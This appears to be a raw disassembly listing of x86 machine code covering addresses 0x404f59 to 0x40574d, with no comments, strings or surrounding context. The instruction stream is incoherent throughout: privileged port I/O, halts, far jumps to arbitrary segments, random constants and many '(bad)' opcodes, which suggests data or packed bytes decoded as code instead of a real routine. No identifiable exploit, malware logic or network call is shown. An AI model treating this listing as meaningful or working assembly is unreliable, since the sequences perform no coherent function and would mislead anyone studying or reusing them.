  404f59:	enter  0x44e2,0x9d
  404f5d:	mov    edi,0x6b3d3f33
  404f62:	repnz outs dx,BYTE PTR ds:[esi]
  404f64:	dec    edi
  404f65:	cmp    BYTE PTR ds:0xf2b1cdff,ah
  404f6b:	or     ch,dl
  404f6d:	addr16 pop ss
  404f6f:	sbb    eax,0xd0b6b224
  404f74:	stos   BYTE PTR es:[edi],al
  404f75:	shl    DWORD PTR [eax],0x9
  404f78:	sbb    bh,ch
  404f7a:	test   edi,eax
  404f7c:	popf   
  404f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f7e:	rcr    DWORD PTR [esi+0x7d],cl
  404f81:	push   edi
  404f82:	bound  ebp,QWORD PTR [ebx]
  404f84:	push   0x29
  404f86:	cmp    DWORD PTR [ebp-0x20],ebp
  404f89:	test   al,0x64
  404f8b:	jl     0x404f77
  404f8d:	sub    al,0x31
  404f8f:	cwde   
  404f90:	sbb    al,0xc0
  404f92:	test   BYTE PTR [esp+ecx*8],dl
  404f95:	gs xor eax,0xe98e57e3
  404f9b:	sub    edi,edi
  404f9d:	scas   al,BYTE PTR es:[edi]
  404f9e:	in     eax,dx
  404f9f:	sti    
  404fa0:	sbb    DWORD PTR [esi],ebp
  404fa2:	shr    BYTE PTR [ecx-0x43],1
  404fa5:	mov    edi,0xb81eac9d
  404faa:	call   0x55e18e
  404faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fb0:	mov    ebx,0xb69ec6f
  404fb5:	mov    esp,0x635ea732
  404fba:	cmp    ch,al
  404fbc:	(bad)  
  404fbd:	ds pop es
  404fbf:	jmp    0x404f99
  404fc1:	cwde   
  404fc2:	mov    bl,0x48
  404fc4:	std    
  404fc5:	pop    edi
  404fc6:	jle    0x404fca
  404fc8:	pop    ecx
  404fc9:	mov    ecx,0x36000dbc
  404fce:	sub    dh,BYTE PTR [ecx+0x30288536]
  404fd4:	mov    al,0xa3
  404fd6:	xchg   ebx,eax
  404fd7:	pop    ebx
  404fd8:	clc    
  404fd9:	in     eax,dx
  404fda:	imul   DWORD PTR [edi-0x3c6bf61b]
  404fe0:	push   ecx
  404fe1:	adc    dl,BYTE PTR ds:0xac37164a
  404fe7:	ins    DWORD PTR es:[edi],dx
  404fe8:	aam    0x3d
  404fea:	push   ds
  404feb:	mov    edi,0x6558e0bb
  404ff0:	cmp    eax,0x96d185e3
  404ff5:	xchg   ebp,eax
  404ff6:	mov    bh,0x32
  404ff8:	push   esp
  404ff9:	ret    0xf2c1
  404ffc:	scas   eax,DWORD PTR es:[edi]
  404ffd:	(bad)  
  404ffe:	pop    ds
  404fff:	mov    dl,0xf5
  405001:	inc    edi
  405002:	mov    cl,0xb1
  405004:	repnz loop 0x404fad
  405007:	pop    edx
  405008:	or     BYTE PTR [eax+0x41],ah
  40500b:	mov    al,0x42
  40500d:	and    bh,BYTE PTR [eax+0x6546c1a2]
  405013:	lods   al,BYTE PTR ds:[esi]
  405014:	mov    esi,0x9b8558b0
  405019:	ret    0x1a9
  40501c:	jge    0x405097
  40501e:	and    bh,BYTE PTR [esi-0x42a1f0d5]
  405024:	pop    ebx
  405025:	scas   eax,DWORD PTR es:[edi]
  405026:	push   edx
  405027:	mov    ds:0x186504e8,eax
  40502c:	push   0x22ffc6ce
  405031:	leave  
  405032:	xchg   edx,esi
  405034:	mov    al,ds:0xaf21089e
  405039:	inc    ebp
  40503a:	shl    dh,0xac
  40503d:	push   0xab302eb5
  405042:	or     ah,dl
  405044:	test   al,0xae
  405046:	(bad)  
  405047:	xor    DWORD PTR [esi+0x530b71],0x153b6164
  405051:	test   bl,bl
  405053:	cmp    cl,ch
  405055:	call   0xe7ea:0x10b46ad4
  40505c:	or     DWORD PTR [esi],eax
  40505e:	cmp    BYTE PTR [eax+0x68f49917],ah
  405064:	push   0xffffff89
  405066:	repnz lds ebx,FWORD PTR [edi-0x7320eb46]
  40506d:	ins    BYTE PTR es:[edi],dx
  40506e:	mov    eax,ds:0xfb6dc362
  405073:	add    BYTE PTR [edx],dl
  405075:	or     BYTE PTR [eax],bh
  405077:	push   ds
  405078:	add    edx,DWORD PTR [ebx]
  40507a:	ror    al,cl
  40507c:	idiv   DWORD PTR [ecx+0x536bfbee]
  405082:	sbb    DWORD PTR [ebx],0xdadfdf23
  405088:	mov    esp,0xdab4440
  40508d:	outs   dx,BYTE PTR ds:[esi]
  40508e:	jno    0x4050f5
  405090:	add    cl,BYTE PTR [ecx-0x4c]
  405093:	fidiv  DWORD PTR [ebx+0x4f]
  405096:	repz repnz cdq 
  405099:	retf   
  40509a:	fcmovb st,st(3)
  40509c:	(bad)  [esi-0x29af931b]
  4050a2:	in     eax,dx
  4050a3:	push   dx
  4050a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050a6:	cmp    DWORD PTR [esi-0x4c],0x12
  4050aa:	xor    dh,BYTE PTR [edi+ecx*8-0xbaaa045]
  4050b1:	pushf  
  4050b2:	cs push es
  4050b4:	repz sbb eax,0x6a93cd22
  4050ba:	out    0x5c,al
  4050bc:	out    dx,ax
  4050be:	cs call 0x93d7:0x71b3a4ee
  4050c6:	jno    0x40505c
  4050c8:	dec    ebp
  4050c9:	and    eax,0xbb944d58
  4050ce:	xor    BYTE PTR [edi],0x66
  4050d1:	cld    
  4050d2:	iret   
  4050d3:	pop    ss
  4050d4:	cmc    
  4050d5:	mov    dl,0x1e
  4050d7:	hlt    
  4050d8:	ret    0x8d89
  4050db:	bound  ebx,QWORD PTR [ecx]
  4050dd:	mov    bh,0x88
  4050df:	daa    
  4050e0:	retf   0x12f9
  4050e3:	das    
  4050e4:	(bad)  
  4050e5:	jnp    0x4050cc
  4050e7:	lahf   
  4050e8:	xchg   ecx,eax
  4050e9:	scas   eax,DWORD PTR es:[edi]
  4050ea:	mov    ds:0xe7e04552,al
  4050ef:	add    al,0x49
  4050f1:	inc    esp
  4050f2:	dec    esp
  4050f3:	lods   eax,DWORD PTR ds:[esi]
  4050f4:	leave  
  4050f5:	or     eax,DWORD PTR [edi]
  4050f7:	mov    dh,al
  4050f9:	lea    esi,[ecx-0x80]
  4050fc:	mov    esi,es
  4050fe:	push   0x6ce4dd92
  405103:	pop    ecx
  405104:	add    DWORD PTR [ecx+0x2b],esi
  405107:	inc    ebx
  405108:	inc    ebp
  405109:	sub    al,0x11
  40510b:	fdivr  st,st(5)
  40510d:	je     0x405144
  40510f:	cmc    
  405110:	cdq    
  405111:	arpl   WORD PTR [ebx],dx
  405113:	dec    ebx
  405114:	(bad)  
  405115:	and    eax,0x40a88c2a
  40511a:	loope  0x405117
  40511c:	lods   eax,DWORD PTR ds:[esi]
  40511d:	mov    bh,0x3f
  40511f:	mov    ecx,0x440b4066
  405124:	cmp    al,0xef
  405126:	mov    eax,0x203435a1
  40512b:	dec    eax
  40512c:	cwde   
  40512d:	dec    ebx
  40512e:	in     eax,dx
  40512f:	add    BYTE PTR ds:0xac1ebd6e,al
  405135:	das    
  405136:	jle    0x4050e1
  405138:	xchg   esi,eax
  405139:	iret   
  40513a:	push   DWORD PTR [ebx]
  40513c:	cmp    BYTE PTR [eax],0x69
  40513f:	jno    0x40513d
  405141:	add    al,0xb
  405143:	mov    al,BYTE PTR [bx+di+0x75]
  405147:	jnp    0x4051ad
  405149:	jbe    0x405175
  40514b:	inc    esi
  40514c:	fdiv   QWORD PTR [esi-0x1e23bff4]
  405152:	jmp    0xdb62d741
  405157:	push   cs
  405158:	sbb    DWORD PTR [esi],ebp
  40515a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40515b:	xor    BYTE PTR [eax],ch
  40515d:	pop    esp
  40515e:	sub    eax,0x951bcb09
  405163:	aaa    
  405164:	mov    edi,0x5f784e27
  405169:	loop   0x4051bd
  40516b:	xchg   BYTE PTR [ebx-0x65321ca4],dh
  405171:	inc    edx
  405172:	lock aad 0xf4
  405175:	dec    ecx
  405176:	aad    0xd6
  405178:	adc    eax,0xe84b0432
  40517d:	outs   dx,DWORD PTR ds:[esi]
  40517e:	adc    edx,DWORD PTR [edi-0xb62e19a]
  405184:	inc    ebp
  405185:	mov    dh,0xfa
  405187:	les    ecx,FWORD PTR ds:0x39622c70
  40518d:	(bad)  [esi-0x1a7d66fc]
  405193:	mov    bl,0x3e
  405195:	test   al,0x25
  405197:	push   ds
  405198:	popa   
  405199:	mov    esi,?
  40519b:	out    dx,eax
  40519c:	mov    cl,0x6d
  40519e:	daa    
  40519f:	fisubr DWORD PTR [eax]
  4051a1:	mov    al,cl
  4051a3:	xor    DWORD PTR [esi-0x25a97fd8],eax
  4051a9:	cmc    
  4051aa:	xchg   esp,eax
  4051ab:	lods   eax,DWORD PTR ds:[esi]
  4051ac:	xchg   edi,eax
  4051ad:	push   edi
  4051ae:	push   ecx
  4051af:	cmp    bl,BYTE PTR [ecx+eiz*8-0x6f]
  4051b3:	mov    DWORD PTR [esi-0x2b],edi
  4051b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051b7:	push   ss
  4051b8:	add    BYTE PTR [esi-0x12],0x62
  4051bc:	addps  xmm2,XMMWORD PTR [eax-0x132d2843]
  4051c3:	push   cs
  4051c4:	add    esi,DWORD PTR [edi-0x26]
  4051c7:	call   0xaf362dfd
  4051cc:	pop    edx
  4051cd:	sbb    al,0xcf
  4051cf:	xchg   esi,eax
  4051d0:	push   0xffffff93
  4051d2:	jmp    0x40518c
  4051d4:	daa    
  4051d5:	inc    ebp
  4051d6:	jg     0x4051c8
  4051d8:	repz cmp ebp,edi
  4051db:	cmp    ebx,ebx
  4051dd:	mov    dh,0xeb
  4051df:	inc    edi
  4051e0:	outs   dx,BYTE PTR ds:[esi]
  4051e1:	mov    bl,0xd6
  4051e3:	pop    ds
  4051e4:	adc    esi,edi
  4051e6:	push   cs
  4051e7:	mov    al,BYTE PTR [ecx+0x24]
  4051ea:	mov    eax,0xfbecd1ad
  4051ef:	sbb    eax,0x7aa8ecbc
  4051f4:	mov    ah,0xce
  4051f6:	mov    eax,ds:0x4658c777
  4051fb:	sbb    DWORD PTR [ecx-0x14],0xffffffab
  4051ff:	cmp    al,0x95
  405201:	adc    esi,DWORD PTR [ebx+ecx*8+0x605013bb]
  405208:	(bad)  
  405209:	mov    ds:0x43a423e5,al
  40520e:	mov    bl,0xe9
  405210:	dec    edx
  405211:	pop    es
  405212:	cdq    
  405213:	sub    al,0x75
  405215:	jbe    0x4051c0
  405217:	scas   eax,DWORD PTR es:[edi]
  405218:	inc    ebp
  405219:	pop    ebx
  40521a:	sub    al,ch
  40521c:	mov    eax,ds:0xfef2dbb7
  405221:	rol    ah,0x37
  405224:	add    eax,0xfe704a09
  405229:	popa   
  40522a:	dec    DWORD PTR [ecx-0x2b]
  40522d:	hlt    
  40522e:	xchg   ebx,eax
  40522f:	stos   DWORD PTR es:[edi],eax
  405230:	pop    ds
  405231:	es pop esi
  405233:	out    dx,eax
  405234:	(bad)  [ebp+edi*4+0x7a]
  405238:	sub    eax,0x3003583c
  40523d:	int3   
  40523e:	push   esp
  40523f:	and    DWORD PTR ds:0x4aea770e,edx
  405245:	mov    bh,0xb5
  405247:	test   DWORD PTR [ebp+0x140fb295],0xe45937f3
  405251:	pop    esi
  405252:	imul   ebp,DWORD PTR [esi],0xdd714ce4
  405258:	mov    dh,BYTE PTR [ecx+eax*2+0x40df5228]
  40525f:	inc    esi
  405260:	inc    ebp
  405261:	mov    bl,0x6d
  405263:	push   esp
  405264:	repnz mov dh,0xfc
  405267:	call   0xe9cd:0x349f3997
  40526e:	pop    ss
  40526f:	mov    ecx,DWORD PTR [ebp+0xf4f625d]
  405275:	jp     0x40526c
  405277:	push   0xe740370d
  40527c:	pop    esi
  40527d:	ret    0xc837
  405280:	je     0x4052a4
  405282:	sti    
  405283:	jle    0x405228
  405285:	dec    ebx
  405286:	jecxz  0x40525e
  405288:	sub    ebx,DWORD PTR [ebx+0x49]
  40528b:	pusha  
  40528c:	loop   0x405230
  40528e:	mov    al,bl
  405290:	scas   al,BYTE PTR es:[edi]
  405291:	in     al,0x1f
  405293:	imul   edi,DWORD PTR [eax+eiz*2+0x41b1ec0c],0x660a85a4
  40529e:	retf   0x5a4f
  4052a1:	retf   
  4052a2:	or     ch,BYTE PTR [esi]
  4052a4:	sbb    eax,0x67f48d30
  4052a9:	push   cs
  4052aa:	push   ss
  4052ab:	test   BYTE PTR [ebx],0x9f
  4052ae:	ins    DWORD PTR es:[edi],dx
  4052af:	dec    ebx
  4052b0:	sbb    BYTE PTR [ecx],dh
  4052b2:	and    BYTE PTR [edx-0x4ea02fb3],ch
  4052b8:	inc    ecx
  4052b9:	inc    ebx
  4052ba:	sbb    eax,0xa516c679
  4052bf:	icebp  
  4052c0:	mov    ss,WORD PTR [ebp+0x53d85c10]
  4052c6:	sbb    dl,BYTE PTR [ebp+0x7]
  4052c9:	xor    bl,BYTE PTR [esi]
  4052cb:	loop   0x405275
  4052cd:	sahf   
  4052ce:	mov    al,ds:0xb14d4d2a
  4052d3:	add    eax,0x76f470b9
  4052d8:	ficomp WORD PTR [eax-0x4]
  4052db:	jbe    0x4052d4
  4052dd:	ror    BYTE PTR [edi],0x2e
  4052e0:	test   ah,dh
  4052e2:	stc    
  4052e3:	push   esi
  4052e4:	jmp    0xe48fc8a2
  4052e9:	fdivr  DWORD PTR [edx-0x1fa09b15]
  4052ef:	mov    ds:0x8141e54f,al
  4052f4:	xchg   ebx,eax
  4052f5:	inc    edx
  4052f6:	push   0xffffffd7
  4052f8:	div    DWORD PTR [eax-0x30d2006b]
  4052fe:	push   esi
  4052ff:	sub    al,0x44
  405301:	mov    dl,0xc3
  405303:	inc    ebp
  405304:	add    DWORD PTR [ebp-0x6],edi
  405307:	std    
  405308:	add    DWORD PTR [ebp+0x5f0255f4],edi
  40530e:	jle    0x405296
  405310:	mov    edx,0x4269b21a
  405315:	cmp    eax,0xc3734b76
  40531a:	inc    ebx
  40531b:	push   edi
  40531c:	shl    bh,0xf3
  40531f:	xchg   edi,eax
  405320:	jmp    0xff9be256
  405325:	xor    DWORD PTR [ecx],ebp
  405327:	pop    eax
  405328:	arpl   WORD PTR [edi+esi*4],si
  40532b:	push   ds
  40532c:	imul   edi,esp,0x9
  40532f:	dec    edx
  405330:	popa   
  405331:	test   DWORD PTR ds:0xfcad9159,0xa8ef8628
  40533b:	pop    ecx
  40533c:	add    eax,0x71d486e8
  405341:	jne    0x405346
  405343:	or     bh,BYTE PTR [edx+0x412dc4]
  405349:	and    BYTE PTR [edi-0x7fc550fb],cl
  40534f:	mov    edx,0x18cf528
  405354:	pop    ss
  405355:	jle    0x4052db
  405357:	pop    ds
  405358:	dec    ebx
  405359:	hlt    
  40535a:	add    BYTE PTR [eax],al
  40535c:	pop    ebx
  40535d:	sub    esp,DWORD PTR [ecx]
  40535f:	add    al,0x8c
  405361:	inc    BYTE PTR [esi]
  405363:	aaa    
  405364:	aaa    
  405365:	pop    ebp
  405366:	call   0x29308e6e
  40536b:	gs pop ebp
  40536d:	repnz add cl,ch
  405370:	and    eax,0xf4ea6213
  405375:	dec    eax
  405376:	cmp    dh,BYTE PTR [edx-0x44]
  405379:	gs or  al,0x35
  40537c:	xor    BYTE PTR [esi],dl
  40537e:	(bad)  
  405380:	xlat   BYTE PTR ds:[ebx]
  405381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405382:	mov    bl,0xc9
  405384:	cmp    ch,ch
  405386:	cmc    
  405387:	jae    0x405333
  405389:	shl    DWORD PTR [edx],cl
  40538b:	pop    ss
  40538c:	std    
  40538d:	retf   0x9b48
  405390:	sub    si,sp
  405393:	mov    cl,0x5e
  405395:	lar    edx,WORD PTR [eax-0x10]
  405399:	add    ebp,DWORD PTR [ecx]
  40539b:	daa    
  40539c:	jmp    0x46cf:0x399322f6
  4053a3:	arpl   WORD PTR [ebp+0x4aee2cfd],ax
  4053a9:	call   esi
  4053ab:	daa    
  4053ac:	sbb    eax,ebp
  4053ae:	repnz cmp ch,0x66
  4053b2:	cs inc esi
  4053b4:	lods   al,BYTE PTR ds:[esi]
  4053b5:	xor    eax,0x7d50311
  4053ba:	lods   al,BYTE PTR ds:[esi]
  4053bb:	mov    edi,0xf72fbb91
  4053c0:	adc    BYTE PTR [ebp+edi*1+0x4d],cl
  4053c4:	sar    cl,1
  4053c6:	mov    ecx,0x9ad38dee
  4053cb:	scas   eax,DWORD PTR es:[edi]
  4053cc:	out    0x30,eax
  4053ce:	mov    ebx,0xdcc8fb2b
  4053d3:	mov    ebp,0x62909310
  4053d8:	in     eax,0xd0
  4053da:	mov    ax,ds:0x9030c2ae
  4053e0:	dec    esi
  4053e1:	adc    al,0xce
  4053e3:	test   BYTE PTR [eax-0x532b724b],dh
  4053e9:	call   0x45afdd4c
  4053ee:	std    
  4053ef:	sub    BYTE PTR [ebp-0x77],dh
  4053f2:	lods   al,BYTE PTR ds:[esi]
  4053f3:	in     al,dx
  4053f4:	mov    dh,al
  4053f6:	call   0x3170b9be
  4053fb:	cmp    ebp,DWORD PTR [esi+0x5b]
  4053fe:	cld    
  4053ff:	cmp    eax,0x666186cc
  405404:	test   al,0xce
  405406:	dec    ebp
  405407:	sub    al,0xe3
  405409:	fidiv  WORD PTR cs:[ebx-0x4033f347]
  405410:	retf   
  405411:	(bad)  
  405412:	out    dx,al
  405413:	into   
  405414:	aaa    
  405415:	pop    esi
  405416:	das    
  405417:	xchg   edi,eax
  405418:	xor    BYTE PTR [eax-0x6d],ah
  40541b:	stos   DWORD PTR es:[edi],eax
  40541c:	repnz push 0xa27b850e
  405422:	or     dl,BYTE PTR [edx-0x75]
  405425:	test   DWORD PTR [ecx],ebx
  405427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405428:	sub    edx,DWORD PTR [ebx-0x1fe936b5]
  40542e:	mov    al,0x6d
  405430:	dec    ebx
  405431:	adc    al,0xca
  405433:	push   0x58
  405435:	enter  0x506,0xe9
  405439:	fadd   st(7),st
  40543b:	std    
  40543c:	daa    
  40543d:	dec    eax
  40543e:	pop    edx
  40543f:	and    esi,DWORD PTR [ecx+0x6f]
  405442:	and    BYTE PTR [ebx],0x83
  405445:	xchg   bx,ax
  405447:	int    0xef
  405449:	mov    bh,0x82
  40544b:	pop    esp
  40544c:	(bad)  
  40544d:	cwde   
  40544e:	sub    eax,0x205f3326
  405453:	and    DWORD PTR [eax+0x7611cd3d],ebp
  405459:	adc    eax,0x1d1e0252
  40545e:	mov    DWORD PTR [esi+eiz*4+0x2c],ebp
  405462:	enter  0x6d4d,0x5b
  405466:	in     al,0x66
  405468:	pop    esp
  405469:	mov    ds:0xc8b4436f,eax
  40546e:	add    eax,0xe1b2032
  405473:	pusha  
  405474:	and    eax,0xb15993ce
  405479:	xchg   esp,eax
  40547a:	adc    eax,0x823ec8b
  40547f:	mov    dl,0x67
  405481:	data16 jg 0x4054bb
  405484:	mov    eax,0xb7fd4125
  405489:	icebp  
  40548a:	std    
  40548b:	sbb    DWORD PTR [edi+0x14],ebp
  40548e:	push   ebx
  40548f:	push   ds
  405490:	sub    DWORD PTR [ecx+0x54ad4d19],0xd698a431
  40549a:	sub    DWORD PTR [ebx],ebp
  40549c:	leave  
  40549d:	adc    eax,0x2b84d9ba
  4054a2:	loope  0x4054be
  4054a4:	push   ecx
  4054a5:	retf   0xea88
  4054a8:	mov    cl,0x17
  4054aa:	mov    esp,0x2b5c0c22
  4054af:	and    eax,0x58
  4054b2:	jne    0x405507
  4054b4:	push   cs
  4054b5:	mov    esp,0x85ed585c
  4054ba:	xchg   esi,eax
  4054bb:	jl     0x40550d
  4054bd:	je     0x40546e
  4054bf:	test   BYTE PTR [ebx+0x4d],dh
  4054c2:	sbb    BYTE PTR [ecx+0x22],ah
  4054c5:	mov    eax,0xa75b7c83
  4054ca:	jge    0x40551e
  4054cc:	jg     0x405516
  4054ce:	icebp  
  4054cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054d0:	jg     0x405530
  4054d2:	stos   DWORD PTR es:[edi],eax
  4054d3:	ja     0x4054a8
  4054d5:	mov    ebp,DWORD PTR [edi+0x6c]
  4054d8:	ficomp WORD PTR [edi+0x5a]
  4054db:	(bad)  
  4054dc:	cmp    DWORD PTR [edi],0xc902ef22
  4054e2:	sub    ecx,esi
  4054e4:	sbb    BYTE PTR [edx],0x3e
  4054e7:	xchg   edi,eax
  4054e8:	and    dl,bl
  4054ea:	ret    
  4054eb:	adc    edx,esi
  4054ed:	push   ds
  4054ee:	pop    ebp
  4054ef:	adc    al,0xb0
  4054f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054f2:	adc    edx,DWORD PTR [esi-0x4]
  4054f5:	aad    0xf5
  4054f7:	sti    
  4054f8:	ror    DWORD PTR [ecx],1
  4054fa:	jecxz  0x405498
  4054fc:	not    DWORD PTR [edi-0x64]
  4054ff:	mov    cl,0x56
  405501:	imul   edi,DWORD PTR [ebx+0x1b5755f6],0x4c1c90bf
  40550b:	sbb    BYTE PTR [edx+0x39],0x42
  40550f:	cmp    dl,BYTE PTR [edi+0x3d]
  405512:	dec    ecx
  405513:	dec    esi
  405514:	ror    BYTE PTR [edi-0x2e4d6c30],0x23
  40551b:	std    
  40551c:	jnp    0x40559d
  40551e:	add    BYTE PTR [eax-0x3],dh
  405521:	jb     0x405566
  405523:	cli    
  405524:	icebp  
  405525:	xor    ch,BYTE PTR [esi+0x76]
  405528:	mov    edx,DWORD PTR [esi+eiz*1+0x73c055cf]
  40552f:	push   esp
  405530:	jmp    0x48ad:0x7924fba3
  405537:	std    
  405538:	and    ch,BYTE PTR [eax-0x49420738]
  40553e:	pop    ebp
  40553f:	scas   al,BYTE PTR es:[edi]
  405540:	jb     0x4054dc
  405542:	daa    
  405543:	jg     0x4055b8
  405545:	xor    edi,esp
  405547:	js     0x405540
  405549:	sbb    DWORD PTR [esi+ecx*4+0x22],ebx
  40554d:	pop    ebx
  40554e:	xchg   DWORD PTR [ecx-0x69],ecx
  405551:	in     eax,dx
  405552:	test   eax,0x68d28389
  405557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405558:	add    eax,0x71d3c702
  40555d:	dec    ecx
  40555e:	jb     0x405596
  405560:	fwait
  405561:	test   DWORD PTR [edi-0x20],eax
  405564:	jno    0x4055dd
  405566:	pop    eax
  405567:	mov    ds:0x7e50f4a,eax
  40556c:	test   BYTE PTR [esi],bh
  40556e:	hlt    
  40556f:	int    0x61
  405571:	ret    0xaf7c
  405574:	add    bl,BYTE PTR [ecx]
  405576:	dec    ebx
  405577:	sub    eax,0x644a862d
  40557c:	cmp    esi,DWORD PTR [eax]
  40557e:	ins    DWORD PTR es:[edi],dx
  40557f:	cmp    dl,BYTE PTR [edx+edx*1-0x8]
  405583:	imul   eax,DWORD PTR [ecx+0x2d],0xba881dd1
  40558a:	xchg   edx,eax
  40558b:	stos   BYTE PTR es:[edi],al
  40558c:	sub    BYTE PTR [ecx+edi*8],bh
  40558f:	xchg   edx,eax
  405590:	frstor [ebx+0x475f3528]
  405596:	adc    dh,BYTE PTR [edx]
  405598:	jnp    0x40553a
  40559a:	cwde   
  40559b:	loope  0x4055c3
  40559d:	aaa    
  40559e:	ror    cl,cl
  4055a0:	or     dh,BYTE PTR fs:[esi+eax*8-0x6b]
  4055a5:	xchg   DWORD PTR [eax+0x752d56ea],ebx
  4055ab:	mov    edi,0xdbb7fd74
  4055b0:	pusha  
  4055b1:	dec    edi
  4055b2:	mov    BYTE PTR [eax+0x676fe1dc],dh
  4055b8:	sbb    esp,DWORD PTR [ecx]
  4055ba:	repnz cmp ebp,DWORD PTR [ecx+0x41]
  4055be:	mov    eax,ds:0x4c0e3081
  4055c3:	in     eax,dx
  4055c4:	cwde   
  4055c5:	sub    BYTE PTR [esi+edi*1],al
  4055c8:	mov    bl,0xab
  4055ca:	jg     0x4055c3
  4055cc:	pop    eax
  4055cd:	sbb    eax,0xdcd96a8c
  4055d2:	and    BYTE PTR [edi-0x76],bh
  4055d5:	(bad)  
  4055d6:	(bad)  
  4055d7:	push   esp
  4055d8:	(bad)  
  4055da:	sbb    al,0x8b
  4055dc:	push   ss
  4055dd:	mov    cl,0x8c
  4055df:	pop    ds
  4055e0:	cmp    BYTE PTR [ecx-0x10],dl
  4055e3:	(bad)  
  4055e5:	xchg   edi,eax
  4055e6:	int    0xd7
  4055e8:	pop    ebp
  4055e9:	outs   dx,DWORD PTR ds:[esi]
  4055ea:	sbb    eax,0x84b7ca6b
  4055ef:	cdq    
  4055f0:	icebp  
  4055f1:	mov    ds:0xfa1a5dca,eax
  4055f6:	lods   al,BYTE PTR ds:[esi]
  4055f7:	mov    ds:0xa63cf6a4,eax
  4055fc:	inc    edi
  4055fd:	push   esi
  4055fe:	push   esi
  4055ff:	loope  0x40565a
  405601:	or     ebp,DWORD PTR [ebx+0x72]
  405604:	xchg   ecx,eax
  405605:	dec    ecx
  405606:	lds    eax,FWORD PTR [edx+eax*8]
  405609:	out    0x48,al
  40560b:	in     eax,0xe3
  40560d:	push   ebp
  40560e:	add    DWORD PTR [ebx],ecx
  405610:	push   ds
  405611:	sbb    BYTE PTR [ebp-0x3d],al
  405614:	int3   
  405615:	shr    BYTE PTR [ebp+0x43644e8],0x25
  40561c:	mov    edi,0x2c68adf9
  405621:	xchg   BYTE PTR [ecx],ah
  405623:	xor    ecx,0x30
  405626:	pop    esp
  405627:	stos   BYTE PTR es:[edi],al
  405628:	mov    ah,0xa
  40562a:	bound  ebx,QWORD PTR [esi]
  40562c:	dec    ebp
  40562d:	ss cmc 
  40562f:	mov    edi,0xe2e5fa08
  405634:	mov    esi,0xe2ff4d78
  405639:	jl     0x4055df
  40563b:	mov    edx,0xd059cd99
  405640:	push   edx
  405641:	mov    bh,BYTE PTR ds:0xa9becd5f
  405647:	and    ebx,DWORD PTR [edx+edi*4+0x4b]
  40564b:	adc    ecx,edx
  40564d:	xchg   edi,eax
  40564e:	fwait
  40564f:	outs   dx,DWORD PTR ds:[esi]
  405650:	and    BYTE PTR [edi+0x56],cl
  405653:	inc    edx
  405654:	mov    al,ds:0x8533525b
  405659:	push   0xffffff87
  40565b:	inc    ebp
  40565c:	hlt    
  40565d:	mov    bh,0xc9
  40565f:	les    eax,FWORD PTR ds:[ebx-0x67]
  405663:	sahf   
  405664:	adc    DWORD PTR [ecx+eax*1],esi
  405667:	jo     0x405679
  405669:	push   esi
  40566a:	icebp  
  40566b:	test   eax,0x2581c695
  405670:	cmp    esi,DWORD PTR [ecx]
  405672:	dec    esp
  405673:	cdq    
  405674:	sbb    DWORD PTR [esi+0x1c02b089],0xb7a0dad0
  40567e:	sub    al,BYTE PTR [esi]
  405680:	loop   0x405640
  405682:	lock inc edi
  405684:	out    dx,eax
  405685:	jl     0x40568a
  405687:	nop
  405688:	test   BYTE PTR [ebx],bl
  40568a:	sbb    eax,DWORD PTR [ebp-0x2faa21d6]
  405690:	shr    BYTE PTR [edi],0x90
  405693:	test   DWORD PTR [esi+0xa],edi
  405696:	sub    al,0xb7
  405698:	add    DWORD PTR [ebp-0x440879c],0x2cebc64c
  4056a2:	stos   BYTE PTR es:[edi],al
  4056a3:	jns    0x405633
  4056a5:	pop    edx
  4056a6:	cmc    
  4056a7:	add    DWORD PTR [ecx-0x1e3866f1],esi
  4056ad:	dec    esp
  4056ae:	je     0x40567b
  4056b0:	(bad)  
  4056b1:	out    dx,eax
  4056b2:	jmp    0x6bd0:0x5ad50777
  4056b9:	outs   dx,DWORD PTR ds:[esi]
  4056ba:	ficomp WORD PTR [esi-0x4c6f0b64]
  4056c0:	jg     0x405741
  4056c2:	jno    0x4056e9
  4056c4:	ds out 0xf6,al
  4056c7:	jmp    0x311b:0x57b3f368
  4056ce:	retf   
  4056cf:	or     BYTE PTR [ebx],ah
  4056d1:	aad    0x31
  4056d3:	mov    edx,0xd6014c68
  4056d8:	jbe    0x405707
  4056da:	inc    ebp
  4056db:	push   edi
  4056dc:	mov    al,ch
  4056de:	retf   
  4056df:	adc    al,0xc
  4056e1:	out    dx,al
  4056e2:	xchg   BYTE PTR [ebp-0x57],bh
  4056e5:	or     BYTE PTR [esi+0x394443b7],0xbc
  4056ec:	push   esp
  4056ed:	test   eax,0x6a1f0206
  4056f2:	daa    
  4056f3:	pusha  
  4056f4:	or     ch,ch
  4056f6:	rcl    DWORD PTR [eax+0x6ce70760],1
  4056fc:	cmp    ecx,ecx
  4056fe:	popa   
  4056ff:	and    bh,BYTE PTR [esi+0x7504579d]
  405705:	sub    bl,bh
  405707:	daa    
  405708:	pop    eax
  405709:	jp     0x40569a
  40570b:	jmp    0xe7a79944
  405710:	daa    
  405711:	scas   al,BYTE PTR es:[edi]
  405712:	clc    
  405713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405714:	lea    eax,[edi]
  405716:	and    cl,BYTE PTR [ecx-0x15]
  405719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40571a:	bound  ebx,QWORD PTR [esi]
  40571c:	jecxz  0x405761
  40571e:	test   eax,0x585148f
  405723:	sbb    al,0x93
  405725:	and    BYTE PTR [edx],0x57
  405728:	push   ecx
  405729:	and    eax,0xc15d43ef
  40572e:	xchg   edx,eax
  40572f:	mov    eax,0x7968944e
  405734:	mov    ecx,0xd93e227e
  405739:	ins    BYTE PTR es:[edi],dx
  40573a:	mov    ds:0x4d0cb64e,al
  40573f:	arpl   WORD PTR [edi-0x5c077808],sp
  405745:	lods   eax,DWORD PTR ds:[esi]
  405746:	mov    ch,0xc2
  405748:	xchg   esi,eax
  405749:	sti    
  40574a:	pop    eax
  40574b:	loopne 0x4056e5
  40574d:	or     eax,eax
